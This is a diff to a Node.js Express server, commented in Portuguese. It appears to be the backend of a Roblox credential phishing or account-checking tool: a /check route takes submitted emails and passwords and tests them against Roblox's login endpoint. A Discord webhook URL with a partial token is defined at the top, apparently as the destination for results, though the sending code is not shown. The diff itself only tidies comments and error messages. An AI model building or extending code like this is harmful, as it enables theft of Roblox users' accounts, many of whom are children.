@@ -9,7 +9,7 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoW
 app.use(express.json());
 app.use(express.static('.'));
 
-// Função para fazer login no Roblox com Axios
+// Função para fazer login no Roblox
 async function loginRoblox(email, password) {
     const loginUrl = "https://www.roblox.com/users/login";
     
@@ -27,30 +27,23 @@ async function loginRoblox(email, password) {
             },
             timeout: 10000,
             validateStatus: function (status) {
-                return status >= 200 && status < 400; // Aceita 200 e 302
+                return status >= 200 && status < 400;
             }
         });
 
         const data = response.data;
 
-        // O Roblox retorna { id: 123, username: "User" } no sucesso
         if (data.id && typeof data.id === 'number') {
             return { success: true, data: data, error: null };
         } else {
-            // Se não tem ID, pega no erro
             const errorMsg = data.error || data.message || "Resposta inválida (Sem ID)";
             return { success: false, data: data, error: errorMsg };
         }
 
     } catch (error) {
-        // Captura o erro exato do Axios
-        let errorMsg = "Erro de Conexão";
+        let errorMsg = "Erro Desconhecido";
         if (error.response) {
-            // O servidor respondeu com um código de erro (ex: 400, 401, 500)
             errorMsg = `Erro HTTP ${error.response.status}: ${JSON.stringify(error.response.data)}`;
-        } else if (error.request) {
-            // A requisição foi feita mas não recebeu resposta
-            errorMsg = "Sem resposta do servidor Roblox";
         } else {
             errorMsg = error.message;
         }
@@ -78,7 +71,7 @@ app.post('/check', async (req, res) => {
     }
 
     if (!email || !password) {
-        return res.status(400).json({ success: false, error: "Missing email or password" });
+        return res.json({ success: false, error: "Falta o Email ou a Senha" });
     }
 
     const result = await loginRoblox(email, password);
